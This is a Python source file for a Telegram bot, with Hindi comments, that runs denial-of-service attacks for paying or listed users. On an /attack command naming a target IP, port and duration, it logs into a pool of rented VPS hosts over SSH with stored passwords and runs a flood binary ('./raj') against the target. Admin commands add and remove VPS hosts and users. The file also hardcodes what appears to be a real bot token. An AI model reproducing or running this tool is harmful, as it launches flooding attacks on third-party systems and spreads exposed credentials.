import random
import subprocess
import threading
import paramiko
import telebot
import json
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

TOKEN = "7301744883:AAErpx4jMcE7gnlBFxua4upRbuxdckujKGo"  # 🔥 अपना टोकन डाल
bot = telebot.TeleBot(TOKEN)

ADMIN_IDS = [7855020275]  # 🔥 यहाँ अपने Admin IDs डालें
CONFIG_FILE = "config.json"

# ✅ `config.json` से VPS डिटेल्स लोड करो
with open(CONFIG_FILE, "r") as file:
    config = json.load(file)

VPS_LIST = config["VPS_LIST"]
users = []  # 🌍 यूज़र लिस्ट

def save_config():
    """Config को सेव करता है"""
    with open(CONFIG_FILE, "w") as file:
        json.dump(config, file, indent=4)

def check_vps_status():
    """सभी VPS का स्टेटस चेक करता है, और डाउन VPS के लिए नोटिफिकेशन भेजता है"""
    status_list = []
    failed_vps_list = []
    for vps in VPS_LIST:
        ip, user, password = vps["ip"], vps["user"], vps["password"]
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, username=user, password=password, timeout=5)
            ssh.close()
            status_list.append(f"🟢 `{ip}` **RUNNING** ✅")
        except:
            status_list.append(f"🔴 `{ip}` **DOWN** ❌")
            failed_vps_list.append(ip)
    
    # अगर कोई VPS फेल हुआ हो तो एडमिन को नोटिफिकेशन भेजो
    if failed_vps_list:
        failed_vps_message = "\n".join([f"🔴 `{ip}` **DOWN** ❌" for ip in failed_vps_list])
        for admin_id in ADMIN_IDS:
            bot.send_message(admin_id, f"🚨 **ALERT: Some VPS are DOWN!**\n{failed_vps_message}")
    
    return "\n".join(status_list)

@bot.message_handler(commands=['cvps'])
def handle_check_vps(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "🚫 **आपके पास अनुमति नहीं है!**")
        return
    
    bot.reply_to(message, "⏳ **VPS स्टेटस चेक किया जा रहा है...**")
    status_message = check_vps_status()
    bot.reply_to(message, f"📡 **VPS STATUS:**\n{status_message}")

@bot.message_handler(commands=['avps'])
def add_vps(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "🚫 **आपके पास अनुमति नहीं है!**")
        return
    
    command = message.text.split()
    if len(command) != 4:
        bot.reply_to(message, "⚠️ **Usage:** /add_vps `<IP>` `<USER>` `<PASSWORD>`")
        return
    
    ip, user, password = command[1], command[2], command[3]
    VPS_LIST.append({"ip": ip, "user": user, "password": password})
    save_config()
    bot.reply_to(message, f"✅ **VPS `{ip}` जोड़ा गया!**")

@bot.message_handler(commands=['rvps'])
def remove_vps(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "🚫 **आपके पास अनुमति नहीं है!**")
        return
    
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "⚠️ **Usage:** /remove_vps `<IP>`")
        return
    
    ip = command[1]
    global VPS_LIST
    VPS_LIST = [vps for vps in VPS_LIST if vps["ip"] != ip]
    config["VPS_LIST"] = VPS_LIST
    save_config()
    bot.reply_to(message, f"✅ **VPS `{ip}` हटा दिया गया!**")


def get_available_vps():
    """खाली VPS चुनता है"""
    available_vps = [vps for vps in VPS_LIST if not vps["busy"]]
    return random.choice(available_vps) if available_vps else None

def execute_attack(vps, target, port, duration, chat_id):
    """VPS पर अटैक रन करता है"""
    ip, user, password = vps["ip"], vps["user"], vps["password"]
    attack_command = f"./raj {target} {port} {duration} 9 1200"

    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, username=user, password=password)

        stdin, stdout, stderr = ssh.exec_command(attack_command)
        output, error = stdout.read().decode(), stderr.read().decode()

        ssh.close()
        vps["busy"] = False  # ✅ अटैक के बाद VPS फ्री कर दो

        if error:
            bot.send_message(chat_id, f"❌ **𝐀𝐓𝐓𝐀𝐂𝐊 𝐅𝐀𝐈𝐋𝐄𝐃 𝐅𝐑𝐎𝐌 `{ip}`** 😡")
        else:
            bot.send_message(chat_id, f"✅ **𝐀𝐓𝐓𝐀𝐂𝐊 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄𝐃 𝐅𝐑𝐎𝐌 `{ip}`** 💀🔥")
    except Exception as e:
        vps["busy"] = False
        bot.send_message(chat_id, f"❌ **𝐄𝐑𝐑𝐎𝐑:** {str(e)}")
def main_menu():
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(KeyboardButton('/attack'), KeyboardButton('/vps'))
    markup.add(KeyboardButton('/add'), KeyboardButton('/remove'))
    markup.add(KeyboardButton('/users'))
    return markup

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "🚀 **𝘾𝙝𝙖𝙥𝙧𝙞 𝘼𝙩𝙩𝙖𝙘𝙠 𝘽𝙤𝙩** तैयार है! 🔥", reply_markup=main_menu())

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    if message.from_user.id not in users:
        bot.reply_to(message, "🚫 **आपको अनुमति नहीं है!**")
        return

    command = message.text.split()
    if len(command) != 4:
        bot.reply_to(message, "⚠️ **Usage:** /attack `<IP>` `<PORT>` `<TIME>`")
        return

    target, port, time_duration = command[1], command[2], command[3]

    try:
        port, time_duration = int(port), int(time_duration)
    except ValueError:
        bot.reply_to(message, "❌ **𝐄𝐑𝐑𝐎𝐑:** 𝐏𝐎𝐑𝐓 𝐀𝐍𝐃 𝐓𝐈𝐌𝐄 𝐌𝐔𝐒𝐓 𝐁𝐄 𝐈𝐍𝐓𝐄𝐆𝐄𝐑𝐒!")
        return

    if time_duration > 240:
        bot.reply_to(message, "🚫 **𝐌𝐀𝐗 𝐃𝐔𝐑𝐀𝐓𝐈𝐎𝐍 = 120𝐬!**")
        return

    selected_vps = get_available_vps()
    if not selected_vps:
        bot.reply_to(message, "🚫 **सभी VPS बिजी हैं, बाद में कोशिश करें!**")
        return

    selected_vps["busy"] = True  # ✅ VPS को बिजी मार्क कर दो
    bot.reply_to(message, f"🔥 **Attack started from `{selected_vps['ip']}` on `{target}:{port}` for `{time_duration}`s** 🚀")

    attack_thread = threading.Thread(target=execute_attack, args=(selected_vps, target, port, time_duration, message.chat.id))
    attack_thread.start()  # ✅ अटैक को बैकग्राउंड में चलाओ

@bot.message_handler(commands=['add'])
def add_user(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "🚫 **आपके पास अनुमति नहीं है!**")
        return
    
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "⚠️ **Usage:** /add_user `<USER_ID>`")
        return
    
    user_id = int(command[1])
    if user_id not in users:
        users.append(user_id)
        bot.reply_to(message, f"✅ **User `{user_id}` added successfully!**")
    else:
        bot.reply_to(message, "⚠️ **User पहले से मौजूद है!**")
        
@bot.message_handler(commands=['packet'])
def set_packet_size(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "🚫 **आपके पास अनुमति नहीं है!**")
        return
    
    command = message.text.split()
    if len(command) != 2 or not command[1].isdigit():
        bot.reply_to(message, "⚠️ **Usage:** /set_packet_size `<SIZE>`")
        return
    
    global PACKET_SIZE
    PACKET_SIZE = int(command[1])
    config["PACKET_SIZE"] = PACKET_SIZE
    save_config()
    bot.reply_to(message, f"✅ **Packet Size सेट किया गया: `{PACKET_SIZE}`**")


@bot.message_handler(commands=['set'])
def set_threads(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "🚫 **आपके पास अनुमति नहीं है!**")
        return
    
    command = message.text.split()
    if len(command) != 2 or not command[1].isdigit():
        bot.reply_to(message, "⚠️ **Usage:** /set_threads `<NUMBER>`")
        return
    
    global THREADS
    THREADS = int(command[1])
    config["THREADS"] = THREADS
    save_config()
    bot.reply_to(message, f"✅ **Threads सेट किया गया: `{THREADS}`**")

@bot.message_handler(commands=['remove'])
def remove_user(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "🚫 **आपके पास अनुमति नहीं है!**")
        return
    
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "⚠️ **Usage:** /remove_user `<USER_ID>`")
        return
    
    user_id = int(command[1])
    if user_id in users:
        users.remove(user_id)
        bot.reply_to(message, f"✅ **User `{user_id}` removed successfully!**")
    else:
        bot.reply_to(message, "⚠️ **User मौजूद नहीं है!**")

@bot.message_handler(commands=['users'])
def list_users(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "🚫 **आपके पास अनुमति नहीं है!**")
        return
    
    if not users:
        bot.reply_to(message, "⚠️ **कोई भी यूज़र मौजूद नहीं है!**")
        return
    
    bot.reply_to(message, "👥 **Registered Users:**\n" + "\n".join(map(str, users)))

print("🚀 Bot is running...")
bot.polling()






